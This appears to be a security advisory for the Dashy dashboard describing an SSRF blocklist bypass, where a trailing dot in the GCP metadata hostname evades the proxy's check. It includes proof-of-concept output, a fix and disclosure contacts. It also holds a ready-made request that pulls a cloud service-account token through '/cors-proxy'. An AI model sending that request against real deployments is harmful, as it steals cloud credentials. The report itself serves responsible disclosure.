# Dashy — SSRF filter bypass reaches cloud metadata via trailing-dot FQDN

**Target:** lissy93/dashy
**Version:** 4.7.19 (latest release / current `master`, commit `7fd7714`)
**Component:** server-side CORS proxy (`/cors-proxy`) and status-check (`/status-check`)
**Class:** SSRF — security-control bypass (CWE-918)
**Severity:** High (credential theft on cloud deployments)
**Auth required:** None on default deployments (server auth is off by default; `requireAuth` is a no-op when no server auth is configured — `services/app.js:203`). Any authenticated user otherwise.

---

## Summary

Dashy's CORS proxy deliberately allows arbitrary outbound requests, but it enforces **one** security control: a blocklist that blocks cloud instance-metadata endpoints (`services/utils/request.js`, `validateTargetUrl`). The project's own test suite (`tests/server/cors-proxy.test.js`) confirms this is an intended control — it asserts that `169.254.169.254`, the decimal-encoded form, `metadata.google.internal`, Alibaba `100.100.100.200`, IPv4-mapped IPv6, and metadata redirects are all blocked.

The blocklist compares `new URL(target).hostname` as a **literal string** against a fixed set. The WHATWG URL parser canonicalizes integer/hex/octal and IPv6 IP forms, so those are correctly caught. But it does **not** strip a trailing dot from a DNS name. DNS resolvers treat `name` and `name.` as identical (the trailing dot is the absolute-FQDN form), so:

```
http://metadata.google.internal./...   ->  hostname "metadata.google.internal."  (NOT in blocklist)  ->  resolves to 169.254.169.254
```

This defeats the GCP-metadata block. An attacker reaching `/cors-proxy` on a GCP-hosted Dashy can read the instance metadata service and steal the service-account OAuth token. GCP metadata requires the header `Metadata-Flavor: Google`; the proxy's `CustomHeaders` input lets the attacker set it. The equivalent `%2e` encoding (`metadata.google.internal%2e`) works too — same root cause.

> Scope note: general SSRF to private/loopback IPs through this proxy appears intentional (it's a proxy feature, and those hosts are not on the blocklist). This report is strictly about **bypassing the one control that is enforced** — the cloud-metadata block — which the project's tests show is meant to hold.

---

## Root cause

`services/utils/request.js`, `validateTargetUrl`:

```js
const host = url.hostname.toLowerCase().replace(/^\[|\]$/g, ''); // strips IPv6 brackets only
if (BLOCKED_HOSTS.has(host)) { ...block... }                     // exact-string match
```

`BLOCKED_HOSTS` contains the DNS name `metadata.google.internal`. A trailing dot (or `%2e`) makes `host === 'metadata.google.internal.'`, which is not in the set, while the OS resolver still resolves it to `169.254.169.254`. The check runs on every redirect hop, so this is not a redirect issue — the initial URL itself bypasses it.

---

## Proof of concept (validated against the shipped code)

All three run the **real** Dashy modules from 4.7.19. `localtest.me.` is a public hostname that resolves via real DNS to `127.0.0.1`, standing in for `metadata.google.internal.` (also a DNS name → trailing dot transparent). A mock server plays the metadata service.

**1. The live control accepts the bypass** (real `validateTargetUrl`):
```
http://metadata.google.internal/   -> BLOCKED
http://metadata.google.internal./  -> ALLOWED   (trailing dot)
http://metadata.google.internal%2e/-> ALLOWED   (encoded dot)
```

**2. DNS treats `name` and `name.` identically** (`dns.resolve4`):
```
example.com   -> ["172.66.147.243","104.20.23.154"]
example.com.  -> ["172.66.147.243","104.20.23.154"]   (identical)
```

**3. Full exploit through the real `/cors-proxy` handler** — attacker sends
`Target-URL: http://<metadata-host>.:PORT/computeMetadata/v1/instance/service-accounts/default/token`
and `CustomHeaders: {"Metadata-Flavor":"Google"}`:
```
cors-proxy responded with HTTP 200
body: {"access_token":"ya29.SERVICE_ACCOUNT_TOKEN","expires_in":3599}
>>> metadata token exfiltrated through the trailing-dot bypass
```

The PoC scripts are saved in the scratchpad (`poc.js`, `poc2.js`, `poc3.js`). For a real GCP target, the request is simply:
```
GET /cors-proxy
Target-URL: http://metadata.google.internal./computeMetadata/v1/instance/service-accounts/default/token
CustomHeaders: {"Metadata-Flavor":"Google"}
```

---

## Impact

On a Dashy instance deployed on Google Cloud (Compute Engine, Cloud Run, GKE nodes), an unauthenticated attacker (default config) who can reach the web server can retrieve the VM/service-account access token and any other metadata, then use that token against Google Cloud APIs with the instance's IAM permissions — potential full compromise of the cloud project depending on the attached service account.

---

## Suggested fix

Normalize the host before the blocklist check, so cosmetic DNS variants can't dodge it:

```js
const host = url.hostname.toLowerCase()
  .replace(/^\[|\]$/g, '')   // strip IPv6 brackets
  .replace(/\.+$/, '');       // strip trailing dot(s) — FQDN == non-FQDN
```

Stronger (defense in depth, closes DNS-name-to-metadata variants generally): resolve the host with `dns.lookup(..., { all: true })` and reject if any resolved address falls in a metadata/link-local range (`169.254.0.0/16`, `fd00:ec2::/…`, etc.), rather than matching on hostname strings. Resolve-then-pin the connection to the vetted IP to also close TOCTOU/DNS-rebinding. Add a regression test with the trailing-dot and `%2e` forms.

---

## Reporting path (per the project's SECURITY.md)

- GitHub private advisory: https://github.com/lissy93/dashy/security/advisories/new
- or email `security@as93.net` (PGP `E10EE533A8E5D6F6E231BBCD4C8DEAFFCE3B8D03`)
- Policy asks for 30 days before public disclosure; maintainer credits reporters in release notes.
